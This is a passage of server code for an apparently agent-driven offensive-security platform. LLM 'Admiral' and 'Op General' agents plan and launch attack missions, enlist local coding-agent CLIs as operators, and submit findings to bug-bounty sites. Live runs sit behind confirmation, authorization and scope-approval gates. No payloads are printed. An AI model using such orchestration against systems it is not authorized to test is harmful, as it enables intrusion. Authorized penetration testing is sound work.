app.post('/api/admiral/converse', async (req: Request, res: Response): Promise<void> => {
  try {
    const { messages, provider, model, apiKey } = req.body as {
      messages: ChatMsg[]; provider?: string; model?: string; apiKey?: string;
    };
    if (!Array.isArray(messages) || messages.length === 0) {
      res.status(400).json({ error: 'messages[] required' });
      return;
    }
    let admiralLLM: LLMBackbone;
    if (llm) {
      admiralLLM = llm;
    } else {
      const cfg = resolveGeneralLLMConfig(provider, model, apiKey);
      admiralLLM = new LLMBackbone(cfg);
    }
    const admiral = new Admiral(admiralLLM);
    const turn = await admiral.converse(messages);
    res.json(turn);
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Admiral converse failed' });
  }
});

/**
 * POST /api/admiral/suggest — the Admiral as a PROMPT COACH. Given an operator's system prompt +
 * a failure signal, it proposes line-anchored GENERAL improvements. Every suggestion is run through
 * the anti-fitting gate; challenge-specific tells are flagged REJECTED (the UI never auto-applies them).
 * Body: { operatorPrompt | archetype, failureSignal?, provider?, model?, apiKey? }
 */
app.post('/api/admiral/suggest', async (req: Request, res: Response): Promise<void> => {
  try {
    const { operatorPrompt, archetype, failureSignal, provider, model, apiKey } = req.body as {
      operatorPrompt?: string; archetype?: string; failureSignal?: string; provider?: string; model?: string; apiKey?: string;
    };
    let prompt = typeof operatorPrompt === 'string' ? operatorPrompt : '';
    if (!prompt && archetype) {
      const found = listOperatorPrompts().find((o) => o.archetype === archetype);
      if (found) prompt = found.systemPrompt;
    }
    if (!prompt || prompt.trim().length < 20) {
      res.status(400).json({ error: 'operatorPrompt (or a valid archetype) required' });
      return;
    }
    let admiralLLM: LLMBackbone;
    if (llm) { admiralLLM = llm; }
    else {
      const cfg = resolveGeneralLLMConfig(provider, model, apiKey);
      admiralLLM = new LLMBackbone(cfg);
    }
    const admiral = new Admiral(admiralLLM);
    const advice = await admiral.suggest(prompt, failureSignal);
    res.json(advice);
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Admiral suggest failed' });
  }
});

/**
 * POST /api/admiral/launch — hand a completed brief off to Op General.
 * Body: { brief, confirmed: boolean, provider?, model?, apiKey? }
 *   - fidelity 'dry_run'  → plan ONLY (no mission, no packets); returns the plan.
 *   - fidelity 'live'     → requires confirmed===true + passes the authorization
 *                            gate; plans AND executes via Op General.
 */
app.post('/api/admiral/launch', async (req: Request, res: Response): Promise<void> => {
  try {
    const { brief, confirmed, provider, model, apiKey } = req.body as {
      brief: MissionBrief; confirmed?: boolean; provider?: string; model?: string; apiKey?: string;
    };
    if (!brief || !brief.objective || !brief.target) {
      res.status(400).json({ error: 'brief with objective + target required' });
      return;
    }
    const directive = briefToDirective(brief);
    const live = brief.fidelity === 'live';

    if (live && !confirmed) {
      res.status(409).json({ error: 'LIVE launch requires confirmed=true (authorization gate)', directive });
      return;
    }

    let generalConfig;
    try {
      generalConfig = resolveGeneralLLMConfig(provider, model, apiKey);
    } catch (error: any) {
      res.status(400).json({ error: error.message || 'API key required' });
      return;
    }

    // LIVE execution passes the same autonomous-execution guard as /api/general/auto
    if (live) {
      const guard = guardAction(req.body as Record<string, unknown>, 'autonomous_execution', brief.target,
        `Admiral LIVE launch: ${brief.objective}`);
      if (!guard.allowed) { blockForApproval(res, guard); return; }
    }

    const generalLLM = new LLMBackbone(generalConfig);
    // Stop the outgoing General's monitor before dropping the reference (setInterval leak).
    if (activeGeneral) activeGeneral.stopMonitoring();
    activeGeneral = new OpGeneral(generalLLM);
    activeGeneral.on('general:planning', (data) => broadcastEvent('general:planning', data as any));
    activeGeneral.on('general:plan_ready', (data) => broadcastEvent('general:plan_ready', data as any));
    activeGeneral.on('general:review', (data) => broadcastEvent('general:review', data as any));
    activeGeneral.on('general:sitrep', (data) => broadcastEvent('general:sitrep', data as any));

    broadcastEvent('admiral:launch', { brief, fidelity: brief.fidelity });
    const plan = await activeGeneral.planOperation(directive);

    if (!live) {
      // DRY-RUN: plan only, no mission, no packets, no claimed findings.
      res.json({ mode: 'dry_run', plan, directive, note: 'Plan only — no packets sent, no findings claimed.' });
      return;
    }

    // LIVE: execute the plan via Op General — REAL bring-up (operators spawned + mission started),
    // the same path /api/general/execute uses. Not a "mission launching" stub.
    const execConfig = activeGeneral.executePlan();
    if (execConfig.review.status === 'hold') {
      res.status(409).json({ error: 'General plan gate is HOLD', mode: 'live', plan, review: execConfig.review });
      return;
    }
    const outOfScopeTargets = ensureExecTargetsAuthorized(execConfig.targets, brief.target, req.body as Record<string, unknown>);
    if (outOfScopeTargets.length) {
      const approvals = outOfScopeTargets.map(target => createApprovalRequest(
        'autonomous_execution',
        target,
        `Admiral plan expanded execution scope from ${brief.target} to ${target}`,
        req.body as Record<string, unknown>
      ));
      res.status(403).json({
        error: 'Admiral LIVE plan needs approval for expanded target scope',
        approvedTarget: brief.target,
        outOfScopeTargets,
        approvals,
        next: 'Approve the expanded target receipts, then retry /api/admiral/launch with approvalIds.',
      });
      return;
    }
    const broughtUp = bringUpMissionFromPlan(execConfig, generalConfig);
    res.json({
      mode: 'live', plan, review: execConfig.review,
      operators: broughtUp.spawnedOps, status: broughtUp.status, sse: '/api/events',
      note: broughtUp.spawnedOps.length
        ? `Mission LIVE — ${broughtUp.spawnedOps.length} operator(s) running. Follow /api/events.`
        : 'Plan produced no operators to spawn — nothing is running.',
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Admiral launch failed' });
  }
});

// =============================================================================
// BOUNTY PLATFORM INTEGRATIONS
// =============================================================================

import {
  getConnector, listConnectors, findingToBountyFinding,
  loadBountyCredentials,
  type BountyPlatform, type BountyCredentials,
} from './integrations/bounty.js';

app.get('/api/bounty/platforms', (_req: Request, res: Response) => {
  res.json({
    platforms: listConnectors().map(p => ({
      id: p,
      name: { hackerone: 'HackerOne', bugcrowd: 'Bugcrowd', intigriti: 'Intigriti', immunefi: 'Immunefi', huntr: 'Huntr', code4rena: 'Code4rena' }[p] || p,
      apiSubmit: ['hackerone', 'bugcrowd'].includes(p),
      portalOnly: !['hackerone', 'bugcrowd'].includes(p),
    })),
  });
});

app.post('/api/bounty/format', (req: Request, res: Response) => {
  try {
    const { platform, programHandle, finding } = req.body as { platform: BountyPlatform; programHandle: string; finding: Record<string, any> };
    if (!platform || !programHandle || !finding) {
      res.status(400).json({ error: 'Required: platform, programHandle, finding' });
      return;
    }
    const connector = getConnector(platform);
    const bountyFinding = findingToBountyFinding(finding);
    const report = connector.formatReport(bountyFinding, programHandle);
    res.json({ report });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

app.post('/api/bounty/submit', async (req: Request, res: Response) => {
  try {
    const { platform, programHandle, finding, dryRun } = req.body as {
      platform: BountyPlatform; programHandle: string; finding: Record<string, any>; dryRun?: boolean;
    };
    if (!platform || !programHandle || !finding) {
      res.status(400).json({ error: 'Required: platform, programHandle, finding' });
      return;
    }
    const creds = loadBountyCredentials(process.cwd());
    const platformCreds: BountyCredentials = creds[platform] || { platform };
    const connector = getConnector(platform);
    const bountyFinding = findingToBountyFinding(finding);
    const report = connector.formatReport(bountyFinding, programHandle);
    const result = await connector.submit(report, platformCreds, { dryRun: dryRun !== false });
    res.json({ result, report });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

app.get('/api/bounty/programs/:platform', async (req: Request, res: Response) => {
  try {
    const platform = req.params.platform as BountyPlatform;
    const query = (req.query.q as string) || '';
    const creds = loadBountyCredentials(process.cwd());
    const platformCreds: BountyCredentials = creds[platform] || { platform };
    const connector = getConnector(platform);
    const programs = await connector.listPrograms(query, platformCreds);
    res.json({ programs });
  } catch (error: any) {
    res.status(400).json({ error: error.message });
  }
});

app.get('/api/bounty/credentials', (_req: Request, res: Response) => {
  const creds = loadBountyCredentials(process.cwd());
  const masked: Record<string, { platform: string; configured: boolean }> = {};
  for (const [k, v] of Object.entries(creds)) {
    masked[k] = { platform: k, configured: Boolean((v as any).apiKey || (v as any).apiIdentifier || (v as any).walletAddress) };
  }
  res.json({ credentials: masked });
});

// =============================================================================
// LOCAL AGENT CONNECTORS — bring-your-own already-authed CLIs (Claude Code / Codex / Hermes)
// =============================================================================
// Detect agent CLIs that are already installed + logged-in on this machine and enlist them as
// operators — no keys are entered or read (auth is detected by artifact PRESENCE only; see
// src/agent/local-agents.ts). In-memory registry of agents connected this session:
type AgentRunSummary = { ok: boolean; latencyMs: number; output: string; error?: string };
type ConnectedLocalAgent = {
  id: string;
  label: string;
  version?: string;
  connectedAt: number;
  lastPing?: AgentRunSummary | null;
  lastHealthCheckAt?: number;
};
const connectedLocalAgents = new Map<string, ConnectedLocalAgent>();
const LOCAL_AGENT_HEALTH_TTL_MS = 30_000;
const LOCAL_AGENT_HEALTH_TIMEOUT_MS = 45_000;

async function refreshConnectedLocalAgentHealth(force = false): Promise<void> {
  const now = Date.now();
  const due = Array.from(connectedLocalAgents.values()).filter((agent) => (
    force ||
    !agent.lastHealthCheckAt ||
    now - agent.lastHealthCheckAt > LOCAL_AGENT_HEALTH_TTL_MS
  ));

  await Promise.all(due.map(async (agent) => {
    const result = await pingLocalAgent(agent.id, undefined, LOCAL_AGENT_HEALTH_TIMEOUT_MS);
    const current = connectedLocalAgents.get(agent.id);
    if (!current) return;
    current.lastPing = result;
    current.lastHealthCheckAt = Date.now();
  }));
}

async function requireLiveLocalAgent(model: string | undefined): Promise<{ ok: true; id: string } | { ok: false; error: string }> {
  const id = String(model || 'codex').trim();
  const entry = connectedLocalAgents.get(id);
  if (!entry) return { ok: false, error: `local agent "${id}" is not connected — connect it in Settings first` };

  await refreshConnectedLocalAgentHealth(true);
  const refreshed = connectedLocalAgents.get(id);
  if (refreshed?.lastPing?.ok) return { ok: true, id };

  return {
    ok: false,
    error: `local agent "${id}" is connected but not live` +
      (refreshed?.lastPing?.error ? ` — ${refreshed.lastPing.error}` : ''),
  };
}

// GET /api/agents/local/detect — which agents are installed / authed / ready (no tokens spent)
app.get('/api/agents/local/detect', async (_req: Request, res: Response): Promise<void> => {
  try {
    const agents = await detectLocalAgents();
    res.json({ agents, connected: Array.from(connectedLocalAgents.keys()) });
  } catch (e) {
    res.status(500).json({ error: String((e as Error).message) });
  }
});

// POST /api/agents/local/connect { ids:[...] | id, ping?:bool, replace?:bool } — enlist one or many; optional round-trip
app.post('/api/agents/local/connect', async (req: Request, res: Response): Promise<void> => {
  const body = req.body || {};
  const ids: string[] = Array.isArray(body.ids) ? body.ids : (body.id ? [body.id] : []);
  const doPing: boolean = body.ping === true;
  const replace: boolean = body.replace === true;
  if (!ids.length && !replace) { res.status(400).json({ error: 'provide ids:[] or id' }); return; }
  const detected = await detectLocalAgents();
  const results: Array<Record<string, unknown>> = [];
  for (const id of ids) {
    const d = detected.find((a) => a.id === id);
    if (!d || !d.installed) { results.push({ id, status: 'not-installed' }); continue; }
    if (!d.authed) { results.push({ id, status: 'not-authed', version: d.version }); continue; }
    let ping: AgentRunSummary | null = null;
    if (doPing) ping = await pingLocalAgent(id);
    connectedLocalAgents.set(id, {
      id,
      label: d.label,
      version: d.version,
      connectedAt: Date.now(),
      lastPing: ping,
      lastHealthCheckAt: ping ? Date.now() : undefined,
    });
    results.push({ id, status: 'active', label: d.label, version: d.version, authMethod: d.authMethod, ping });
  }
  syncLocalAgentSelection(connectedLocalAgents, ids, replace);
  res.json({ results, connected: Array.from(connectedLocalAgents.values()) });
});

// POST /api/agents/local/ping { id, prompt? } — real one-shot liveness probe (spends a little quota)
app.post('/api/agents/local/ping', async (req: Request, res: Response): Promise<void> => {
  const body = req.body || {};
  if (!body.id) { res.status(400).json({ error: 'id required' }); return; }
  const r = await pingLocalAgent(body.id, body.prompt);
  const entry = connectedLocalAgents.get(body.id);
  if (entry) {
    entry.lastPing = r;
    entry.lastHealthCheckAt = Date.now();
  }
  res.json({ id: body.id, ...r });
});

// POST /api/agents/local/dispatch { id, prompt, model?, timeoutMs? } — drive a connected agent as an operator
app.post('/api/agents/local/dispatch', async (req: Request, res: Response): Promise<void> => {
  const body = req.body || {};
  if (!connectedLocalAgents.has(body.id)) { res.status(400).json({ error: 'agent not connected — connect it first' }); return; }
  if (!body.prompt) { res.status(400).json({ error: 'prompt required' }); return; }
  const r = await runLocalAgent(body.id, body.prompt, { model: body.model, timeoutMs: body.timeoutMs });
  res.json({ id: body.id, ...r });
});

// POST /api/agents/local/disconnect { id }
app.post('/api/agents/local/disconnect', (req: Request, res: Response): void => {
  const id = (req.body || {}).id;
  connectedLocalAgents.delete(id);
  res.json({ ok: true, connected: Array.from(connectedLocalAgents.keys()) });
});

// GET /api/agents/local/status — connected agents, optionally with a bounded live health check.
app.get('/api/agents/local/status', async (req: Request, res: Response): Promise<void> => {
  const check = /^(1|true|yes|on)$/i.test(String(req.query.check || ''));
  if (check) await refreshConnectedLocalAgentHealth(false);
  res.json({ connected: Array.from(connectedLocalAgents.values()) });
});

// =============================================================================
// STATIC FILE SERVING
// =============================================================================

// Bare root → land on the UI. Registered right beside the /ui mount so it only
// matches the exact '/' path and never shadows the /api/* routes above.
app.get('/', (_req: Request, res: Response) => res.redirect('/ui/'));

app.use('/ui', express.static('docs'));

// =============================================================================
// ERROR HANDLING
// =============================================================================

app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  console.error('[T3MP3ST] Error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// =============================================================================
// SERVER STARTUP
// =============================================================================

// Crash net: a stray rejected promise or thrown error must never take the whole
// server down mid-mission. Log it and keep the process alive.
process.on('unhandledRejection', (reason) => {
  console.error('[T3MP3ST] unhandledRejection (process kept alive):', reason instanceof Error ? reason.stack || reason.message : reason);
});
process.on('uncaughtException', (err) => {
  console.error('[T3MP3ST] uncaughtException (process kept alive):', err instanceof Error ? err.stack || err.message : err);
});

async function startServer() {
  console.log('');
  console.log('╔════════════════════════════════════════════════════════════════╗');
  console.log('║                     T3MP3ST API Server v2.0                    ║');
  console.log('║                 Offensive-Security Operations                 ║');
  console.log('╚════════════════════════════════════════════════════════════════╝');
  console.log('');

  await loadPersistedState();
  llm = await initLLM();

  // Graceful-shutdown flush: on SIGTERM/SIGINT (Ctrl-C, docker stop, systemctl restart) write
  // any pending debounced snapshot before exiting, so the persistState debounce can't lose the
  // last <1s of state. Registered here (the server-start path) so it never affects test imports.
  // `once` so a second signal falls through to the default disposition if a flush ever hangs.
  let shuttingDown = false;
  const flushAndExit = (signal: NodeJS.Signals): void => {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log(`[T3MP3ST] ${signal} received — flushing state, shutting down…`);
    void flushPersist().catch(() => { /* best-effort */ }).finally(() => process.exit(0));
  };
  process.once('SIGTERM', flushAndExit);
  process.once('SIGINT', flushAndExit);

  app.listen(Number(PORT), HOST, () => {
    console.log(`[T3MP3ST] Server running at http://${HOST}:${PORT}`);
    console.log(`[T3MP3ST] Web UI available at http://${HOST}:${PORT}/ui`);
    if (!HOST_IS_LOOPBACK) {
      console.warn('');
      console.warn(`  ⚠️  EXPOSURE WARNING: bound to NON-LOOPBACK host "${HOST}". This API executes`);
      console.warn('     commands and has NO built-in authentication — the Origin/Host guards only');
      console.warn('     cover the localhost threat model. Do NOT put this on a LAN or the internet');
      console.warn('     without real auth (a Bearer-token reverse proxy) in front of it.');
      console.warn('');
    }
    console.log('');
    console.log('[T3MP3ST] Mission Dispatch (NEW):');
    console.log('  POST /api/mission/start              - Start mission with real operators');
    console.log('  POST /api/mission/stop               - Stop active mission');
    console.log('  POST /api/mission/pause              - Pause mission');
    console.log('  POST /api/mission/resume             - Resume mission');
    console.log('  GET  /api/mission/status             - Mission status + operator states');
    console.log('  GET  /api/mission/findings           - All findings from mission');
    console.log('  POST /api/pressure-paths             - Plan receipt-gated offensive pressure paths');
    console.log('  POST /api/pressure-paths/canary      - Rehearse top path in local canary simulator');
    console.log('  POST /api/pressure-paths/duel        - Run hunter-vs-skeptic route duel');
    console.log('  POST /api/pressure-paths/mutate      - Fork survived routes into local mutation gauntlet');
    console.log('  POST /api/pressure-paths/chains      - Compose mutations into local fang chains');
    console.log('  POST /api/operators/spawn            - Spawn operator');
    console.log('  POST /api/operators/terminate        - Terminate operator');
    console.log('  GET  /api/operators/list             - List all operators');
    console.log('  POST /api/operators/:id/task         - Dispatch task to operator');
    console.log('  GET  /api/events                     - SSE real-time event stream');
    console.log('');
    console.log('[T3MP3ST] Op General (Autonomous Orchestrator):');
    console.log('  POST /api/general/plan              - Plan operation from directive');
    console.log('  POST /api/general/execute            - Execute planned operation');
    console.log('  POST /api/general/auto               - Full auto: plan + execute');
    console.log('  GET  /api/general/plan               - Get current plan');
    console.log('  GET  /api/general/sitreps            - Get situation reports');
    console.log('  POST /api/general/sitrep             - Force situation report');
    console.log('  POST /api/general/assess             - Final strategic assessment');
    console.log('');
    console.log('[T3MP3ST] Attack Graph (recon-generated, one renderer):');
    console.log('  POST /api/attack-graph               - Scaffold a graph for a target (varies by family)');
    console.log('  POST /api/attack-graph/ingest        - Validate a recon-supplied graph');
    console.log('');
    console.log('[T3MP3ST] The Admiral (conversational intake):');
    console.log('  POST /api/admiral/converse           - Talk to the Admiral; it drafts the mission brief');
    console.log('  POST /api/admiral/launch             - Hand the brief to Op General (dry-run plans; live executes)');
    console.log('');
    console.log('[T3MP3ST] Bounty Platforms:');
    console.log('  GET  /api/bounty/platforms           - List supported platforms');
    console.log('  POST /api/bounty/format              - Format finding for a platform');
    console.log('  POST /api/bounty/submit              - Submit report (dry-run default)');
    console.log('  GET  /api/bounty/programs/:platform  - Search programs');
    console.log('  GET  /api/bounty/credentials         - Check configured credentials');
    console.log('');
    console.log('[T3MP3ST] Payload DB: 200+ payloads | Secret Patterns: 15+ | Privesc: 50+ techniques');
    console.log('');
  });
}

startServer().catch(console.error);
